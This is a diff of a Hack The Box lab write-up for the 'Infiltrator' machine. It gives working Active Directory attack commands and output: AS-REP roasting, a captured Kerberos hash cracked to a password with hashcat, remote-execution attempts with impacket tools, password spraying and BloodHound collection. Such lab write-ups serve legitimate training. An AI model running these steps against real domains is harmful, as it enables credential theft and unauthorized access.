@@ -384,9 +384,11 @@ e.rodriguez@infiltrator.htb
 e_rodriguez@infiltrator.htb
 ```
 
-## 3. [AS-REP Roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)
+## 3. Credential Access
 
-### 3.1. Use kerbrute to find users with preauthentication disabled
+### 3.1. [AS-REP Roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)
+
+#### 3.1.1. Use kerbrute to find users with preauthentication disabled
 
 ```console
 root@kali:~# pipx install kerbrute
@@ -410,7 +412,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] No passwords were discovered :'(
 ```
 
-### 3.2. Use GetNPUsers to get password hashes
+#### 3.1.2. Use GetNPUsers to get password hashes
 
 `l.clark@infiltrator.htb` identified by kerbrute to not have preauthentication enabled, let's use `GetNPUsers` to get the hash
 
@@ -422,7 +424,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 $krb5asrep$23$l.clark@INFILTRATOR.HTB:392b84344073b27971826e9c498b3743$8b5c4ee1ae459ca3198ea968551976e621b051def64daaff0547d61544297af495ad05af527bf027589c27c4d6b16aeb930e37b7dbdc1bbefa556b6ed84d1560ececcf06f81bb1224c8b41f8f6e763fe403128e0d2116a1450380b2c21fd878664b0f474e4e7b8357c077c75bfc1f5d4d04cfb620d51d3ebb5200a6a5d0c34b277f51d5da89e9b304b88ea4f4ae016435aae7e13d8ca2e04ac79b9886e9e9ec51dabfb1490e4ed337c594a6a4350b2d08df5bf496647fccf4b2dc5fee1c9f48531b590aaa71cd7978af8f9b3c698a85d716a5268cacc8f92213677bf91ef9e18331cb08b7e780c0e40bc416559b59b7f1183
 ```
 
-### 3.3. Use hashcat to crack the hashes
+#### 3.1.3. Use hashcat to crack the hashes
 
 Copy the hash `$krb5asrep$23$l.clark@INFILTRATOR.HTB:......` into a file `GetNPUsers.out`
 
@@ -509,9 +511,9 @@ Password for `l.clark` found: `WAT?watismypass!`
 >
 > The password is at line number 10 mil+ of `rockyou.txt`, and the match was found in 30 seconds
 
-### 3.4.  Attempt connection to target
+#### 3.1.4.  Attempt connection to target
 
-#### 3.4.1. [evil-winrm](https://wadcoms.github.io/wadcoms/Evil-WinRM/)
+##### 3.1.4.1. [evil-winrm](https://wadcoms.github.io/wadcoms/Evil-WinRM/)
 
 ```console
 root@kali:~# evil-winrm -i dc01.infiltrator.htb -u infiltrator.htb/l.clark -p WAT?watismypass!
@@ -531,7 +533,7 @@ Error: Exiting with code 1
 
 **Failed**: `WinRMAuthorizationError` - user likely not allowed to connect via WinRM
 
-#### 3.4.2. [psexec](https://wadcoms.github.io/wadcoms/Impacket-PsExec/)
+##### 3.1.4.2. [psexec](https://wadcoms.github.io/wadcoms/Impacket-PsExec/)
 
 ```console
 root@kali:~# impacket-psexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
@@ -546,7 +548,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Failed**: no writable shares - user likely has no permissions on the "executable" shares
 
-#### 3.4.3. [atexec](https://wadcoms.github.io/wadcoms/Impacket-atexec-Creds/)
+##### 3.1.4.3. [atexec](https://wadcoms.github.io/wadcoms/Impacket-atexec-Creds/)
 
 ```console
 root@kali:~# impacket-atexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
@@ -559,7 +561,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Failed**: `rpc_s_access_denied` - user likely has no privilege
 
-#### 3.4.4. [wmiexec](https://wadcoms.github.io/wadcoms/Impacket-WMIExec/)
+##### 3.1.4.4. [wmiexec](https://wadcoms.github.io/wadcoms/Impacket-WMIExec/)
 
 ```console
 root@kali:~# impacket-wmiexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
@@ -571,7 +573,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Failed**: `WBEM_E_ACCESS_DENIED` - no permissions, again
 
-#### 3.4.5. [dcomexec](https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/)
+##### 3.1.4.5. [dcomexec](https://wadcoms.github.io/wadcoms/Impacket-DCOMExec/)
 
 ```console
 root@kali:~# impacket-dcomexec "infiltrator.htb/l.clark:WAT?watismypass!"@dc01.infiltrator.htb cmd
@@ -583,7 +585,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 **Failed**: `E_ACCESSDENIED` - no permissions, again²
 
-#### 3.5. Checking for password reuse
+### 3.2. Password spraying
+
+The `l.clark` account wasn't useful, let's check for password reuse on other accounts
 
 Prepare the sAMAccountName list:
 
@@ -612,4 +616,126 @@ SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\m.h
 SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
 ```
 
-Received `STATUS_ACCOUNT_RESTRICTION` for users `d.anderson` and `m.harris` → this can mean that the password works, just that they have no SMB permissions on the target
+Received `STATUS_ACCOUNT_RESTRICTION` for users `d.anderson` and `m.harris` → this can mean that the password is valid, but the accounts may not have much access
+
+
+### 3.3. Active Directory discovery: Bloodhound
+
+Let's check what access does the accounts found have on the domain
+
+#### 3.3.1. Generating TGT
+
+Attempting to get TGT with `d.anderson` account resutled in `KRB_AP_ERR_SKEW(Clock skew too great)` error:
+
+```console
+root@kali:~# impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip dc01.infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+
+Let's sync the time on Kali with the target
+
+Install `ntpdate`: `apt -y install ntpdate`
+
+Turns out the time on Kali was 885 seconds ahead of the target
+
+```console
+root@kali:~# ntpdate -q dc01.infiltrator.htb
+2024-12-24 12:41:39.610084 (+0800) -885.953455 +/- 0.002572 dc01.infiltrator.htb 10.10.11.31 s1 no-leap
+```
+
+Disable NTP on Kali and sync the time with the target
+
+```console
+root@kali:~# timedatectl set-ntp 0
+
+root@kali:~# ntpdate dc01.infiltrator.htb
+2024-12-24 12:41:39.671106 (+0800) -885.953418 +/- 0.002733 dc01.infiltrator.htb 10.10.11.31 s1 no-leap
+CLOCK: time stepped by -885.953418
+
+root@kali:~# ntpdate -q dc01.infiltrator.htb
+2024-12-24 12:41:39.736502 (+0800) -0.000016 +/- 0.002534 dc01.infiltrator.htb 10.10.11.31 s1 no-leap
+```
+
+`getTGT` works after the time sync
+
+```console
+root@kali:~# impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip dc01.infiltrator.htb
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in d.anderson.ccache
+```
+
+#### 3.3.2. Generating bloodhound packages
+
+Running `bloodhound-python` works for `l.clark` and `d.anderson`, but doesn't see to work for `m.harris`
+
+```console
+root@kali:~# bloodhound-python -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
+INFO: Found AD domain: infiltrator.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 14 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc01.infiltrator.htb
+INFO: Done in 00M 02S
+INFO: Compressing output into 20241224124342_bloodhound.zip
+```
+
+```console
+root@kali:~# bloodhound-python -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
+INFO: Found AD domain: infiltrator.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+INFO: Found 14 users
+INFO: Found 58 groups
+INFO: Found 2 gpos
+INFO: Found 2 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc01.infiltrator.htb
+INFO: Done in 00M 02S
+INFO: Compressing output into 20241224124349_bloodhound.zip
+```
+
+```console
+root@kali:~# bloodhound-python -d infiltrator.htb -u m.harris -p 'WAT?watismypass!' -ns 10.10.11.31 -c all  --dns-tcp --zip
+INFO: Found AD domain: infiltrator.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
+INFO: Connecting to LDAP server: dc01.infiltrator.htb
+ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0907FC, comment: AcceptSecurityContext error, data 52f, v4563
+Traceback (most recent call last):
+  File "/usr/bin/bloodhound-python", line 33, in <module>
+    sys.exit(load_entry_point('bloodhound==1.7.2', 'console_scripts', 'bloodhound-python')())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 343, in main
+    bloodhound.run(collect=collect,
+  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 78, in run
+    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect, cache_computers=do_computer_enum)
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 571, in prefetch_info
+    self.get_objecttype()
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 260, in get_objecttype
+    self.ldap_connect()
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 71, in ldap_connect
+    ldap = self.ad.auth.getLDAPConnection(hostname=self.hostname, ip=ip,
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/authentication.py", line 125, in getLDAPConnection
+    raise CollectionException('Could not authenticate to LDAP. Check your credentials and LDAP server requirements.')
+bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
+```
